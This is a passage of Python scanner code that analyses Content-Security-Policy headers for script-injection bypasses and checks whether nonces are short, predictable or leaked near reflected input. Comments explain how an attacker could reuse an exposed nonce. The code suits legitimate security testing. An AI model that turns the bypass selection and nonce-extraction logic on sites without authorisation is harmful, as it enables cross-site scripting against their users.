    src = family_sources(rep.directives, family)
    if "'unsafe-inline'" not in " ".join(src):
        return False
    return bool(_NONCE_OR_HASH_RE.search(" ".join(src)))


def is_strict_inline(csp_header: str) -> bool:
    """Phase 35: True when inline reflection payloads are FUTILE.

    Strict means: a script restriction exists, inline is NOT re-allowed for
    any delivery family ('unsafe-inline' inert-ized or absent), and the
    analyzer found no bypass path.  Nonce policies are conservatively NOT
    considered strict (a leaked/reflected nonce re-enables inline tags and
    the dedicated nonce-reuse layer handles that case).
    """
    rep = analyze(csp_header or "")
    if not rep.directives or rep.bypassable:
        return False          # inline / gadget / wildcard route works
    if not (family_sources(rep.directives, "elem")
            or family_sources(rep.directives, "attr")):
        return False          # nothing restricts scripts -- not "strict"
    if any(v.startswith("'nonce-")
           for v in family_sources(rep.directives, "elem")):
        return False
    return not any(family_allows_inline(rep.directives, family)
                   for family in SCRIPT_FAMILIES)


def best_bypass(csp_header: str) -> dict | None:
    """Return the simplest CSP bypass payload, or None if CSP is strong."""
    rep = analyze(csp_header)
    if not rep.bypasses:
        return None
    # Prefer inline > wildcard > script_gadget (simplest to exploit).  There
    # is no "eval" slot: Phase 278 removed the only producer of that type
    # (an eval-only policy now yields ``bypassable=False`` and no entries).
    for t in ("inline", "wildcard", "script_gadget"):
        for b in rep.bypasses:
            if b["type"] == t:
                return b
    return rep.bypasses[0]


# ---------------------------------------------------------------------------
# Phase 27-2: CSP nonce reuse / exposure analysis
# ---------------------------------------------------------------------------
# A nonce-based CSP (`script-src 'nonce-<RANDOM>'`) is bypassable if:
#
#   1. **Nonce reuse across responses** -- the same nonce appears in
#      multiple HTTP responses for the same URL.  This happens when a
#      server caches the page (including the nonce) or when the nonce
#      is hardcoded.  An attacker who can read one response (e.g. via
#      a cache-poisoning or reflected-content leak) learns the nonce
#      and can inject ``<script nonce=KNOWN>`` on any other request.
#
#   2. **Nonce reuse within a single response** -- the same nonce
#      appears in multiple ``<script nonce=...>`` tags.  This is
#      legitimate (every script tag needs the nonce), but if the nonce
#      ALSO appears in attacker-controllable locations (e.g. reflected
#      in the body, in a URL parameter, or in a comment), an attacker
#      who can inject a ``<script>`` tag can read the nonce from the
#      page and use it on their injected tag (the nonce is not secret
#      once the page is rendered -- but a leaked nonce defeats the
#      purpose of CSP nonces if the attacker can also inject a tag).
#
#   3. **Nonce reflected in attacker-controllable input** -- the nonce
#      value appears inside a reflected parameter's echo.  This is the
#      critical bypass: if the nonce is reflected in the page, an
#      attacker can craft a URL that includes the nonce in the
#      reflected payload, and any injected ``<script>`` tag can pick
#      up the nonce from the page DOM (e.g. via ``document.querySelector``
#      -- a script-gadget pattern).
#
#   4. **Nonce too short / predictable** -- a nonce shorter than 16
#      hex chars (64 bits) is brute-forceable; a nonce that looks like
#      a sequential counter (all digits, low entropy) is predictable.
#
# This function performs STATIC analysis on a single response.  The
# scanner calls it once per endpoint and aggregates the results across
# requests to detect cross-response reuse.

import re as _re_module  # noqa: E402

# Matches ``nonce="<value>"`` or ``nonce='<value>'`` or ``nonce=<value>`` in
# both the CSP header and the HTML body.
_NONCE_ATTR_RE = _re_module.compile(
    r'nonce\s*=\s*["\']?([A-Za-z0-9+/_\-=]{8,256})["\']?',
    _re_module.IGNORECASE,
)
# Matches ``'nonce-<value>'`` in the CSP header.
_NONCE_DIRECTIVE_RE = _re_module.compile(
    r"'nonce-([A-Za-z0-9+/_\-=]{8,256})'",
    _re_module.IGNORECASE,
)


def extract_nonces_from_csp(csp_header: str) -> list[str]:
    """Return the list of nonce values declared in the CSP header.

    Example: ``script-src 'nonce-abc123' 'nonce-def456'`` -> ``['abc123', 'def456']``.
    """
    if not csp_header:
        return []
    return _NONCE_DIRECTIVE_RE.findall(csp_header)


def extract_nonces_from_html(html: str) -> list[str]:
    """Return the list of nonce values appearing in ``nonce=`` attributes
    in the HTML body.

    Each value may appear multiple times (every <script> tag carries the
    nonce); the list is NOT deduplicated so the caller can detect
    reuse-within-response.
    """
    if not html:
        return []
    return _NONCE_ATTR_RE.findall(html)


def analyze_nonce_reuse(csp_header: str | None, html: str | None) -> dict:
    """Analyze a single response for CSP nonce reuse and exposure.

    Returns a dict::

        {
            "csp_nonces":         list[str],  # nonces in CSP header
            "html_nonces":        list[str],  # nonces in HTML body
            "unique_html_nonces": list[str],  # dedup
            "nonce_count_in_html": int,       # total nonce= attrs
            "reuse_within_response": bool,    # same nonce in many tags (normal)
            "nonce_in_csp":       bool,       # CSP has a nonce directive
            "nonce_length":       int,        # length of first nonce
            "nonce_too_short":    bool,       # < 16 chars (64 bits)
            "nonce_looks_sequential": bool,   # all digits, low entropy
            "exposed_in_html":    bool,       # CSP nonce appears in HTML body
            "bypassable":         bool,       # any bypass condition
            "bypass_reasons":     list[str],  # human-readable
        }
    """
    csp_nonces = extract_nonces_from_csp(csp_header or "")
    html_nonces = extract_nonces_from_html(html or "")
    unique_html = list(dict.fromkeys(html_nonces))  # dedup, preserve order

    bypassable = False
    reasons: list[str] = []

    # Check 1: nonce too short / predictable.
    if csp_nonces:
        first = csp_nonces[0]
        if len(first) < 16:
            bypassable = True
            reasons.append(
                f"nonce '{first}' is only {len(first)} chars (< 16); "
                f"brute-forceable in feasible time"
            )
        # Sequential-looking: all digits, <= 8 unique chars.
        if first.isdigit() and len(set(first)) <= 4:
            bypassable = True
            reasons.append(
                f"nonce '{first}' looks sequential (all digits, low entropy); "
                f"likely predictable"
            )

    # Check 2: CSP declares a nonce but it doesn't appear in the HTML.
    # This means the page's <script> tags don't carry the nonce -- they
    # would be BLOCKED by CSP.  The page is broken (or the nonce is
    # applied via a different mechanism, e.g. a meta tag).
    if csp_nonces and not html_nonces:
        # Not a bypass per se, but a misconfiguration worth flagging.
        reasons.append(
            "CSP declares a nonce but no <script nonce=...> appears in the "
            "HTML -- scripts may be blocked, or the nonce is applied via a "
            "non-standard mechanism"
        )

    # Check 3: nonce exposed in HTML body (this is normal for legitimate
    # nonce-based CSP -- every <script> tag carries it).  We only flag
    # this as a bypass risk if the nonce ALSO appears in an attacker-
    # controllable location, which the caller checks separately by
    # reflecting a marker and seeing if the nonce is near it.
    exposed = bool(csp_nonces) and any(
        n in (html or "") for n in csp_nonces
    )

    # Check 4: multiple DIFFERENT nonces in CSP (uncommon -- usually means
    # the page is mid-migration or has a config bug).
    if len(set(csp_nonces)) > 1:
        reasons.append(
            f"CSP declares {len(set(csp_nonces))} different nonces; "
            f"usually a single nonce per response is expected (config bug?)"
        )

    return {
        "csp_nonces": csp_nonces,
        "html_nonces": html_nonces,
        "unique_html_nonces": unique_html,
        "nonce_count_in_html": len(html_nonces),
        "reuse_within_response": len(html_nonces) > 1 and len(unique_html) == 1,
        "nonce_in_csp": bool(csp_nonces),
        "nonce_length": len(csp_nonces[0]) if csp_nonces else 0,
        "nonce_too_short": bool(csp_nonces) and len(csp_nonces[0]) < 16,
        "nonce_looks_sequential": bool(csp_nonces) and csp_nonces[0].isdigit()
                                   and len(set(csp_nonces[0])) <= 4,
        "exposed_in_html": exposed,
        "bypassable": bypassable,
        "bypass_reasons": reasons,
    }


def detect_nonce_near_marker(csp_header: str, html: str, marker: str) -> dict:
    """Detect whether the CSP nonce appears near an attacker-controllable
    marker in the HTML body.

    This is the critical nonce-extraction bypass: if the nonce is
    reflected in a location the attacker controls (e.g. inside a
    reflected parameter's echo), an attacker who can inject a
    ``<script>`` tag can read the nonce from the page DOM and add it
    to their injected tag.

    Returns::

        {
            "nonce_exposed_near_marker": bool,
            "nonce_value":               str,   # the exposed nonce, if any
            "distance":                  int,   # char distance marker<->nonce
            "snippet":                   str,   # ~200 char window
        }
    """
    if not csp_header or not html or not marker:
        return {
            "nonce_exposed_near_marker": False,
            "nonce_value": "",
            "distance": -1,
            "snippet": "",
        }
    nonces = extract_nonces_from_csp(csp_header)
    if not nonces:
        return {
            "nonce_exposed_near_marker": False,
            "nonce_value": "",
            "distance": -1,
            "snippet": "",
        }
    marker_pos = html.find(marker)
    if marker_pos == -1:
        return {
            "nonce_exposed_near_marker": False,
            "nonce_value": "",
            "distance": -1,
            "snippet": "",
        }
    # Find the closest nonce to the marker.
    best_nonce = ""
    best_dist = -1
    best_window_start = 0
    best_window_end = 0
    for nonce in nonces:
        # Search both as ``nonce="<value>"`` and bare ``<value>``.
        for m in _re_module.finditer(_re_module.escape(nonce), html):
            d = abs(m.start() - marker_pos)
            if best_dist == -1 or d < best_dist:
                best_dist = d
                best_nonce = nonce
                best_window_start = max(0, min(m.start(), marker_pos) - 60)
                best_window_end = min(len(html), max(m.end(), marker_pos + len(marker)) + 60)
    # If the nonce appears within 500 chars of the marker, flag it.
    exposed = best_dist != -1 and best_dist <= 500
    return {
        "nonce_exposed_near_marker": exposed,
        "nonce_value": best_nonce,
        "distance": best_dist,
        "snippet": html[best_window_start:best_window_end].strip()[:400] if exposed else "",
    }
